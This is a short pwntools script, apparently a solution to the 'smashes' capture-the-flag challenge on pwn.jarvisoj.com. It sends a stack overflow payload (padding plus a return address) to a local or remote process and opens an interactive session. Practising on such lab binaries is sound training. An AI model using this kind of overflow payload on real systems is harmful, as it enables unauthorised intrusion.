from pwn import *
debug = True
if debug:
	p = process("./smashes")
else:
	p = remote("pwn.jarvisoj.com","9877")
payload = "a"*0x218 + p64(0x400d20)
gdb.attach(p)
p.sendlineafter("Hello!\nWhat's your name? ",payload)
p.sendline()
p.interactive()
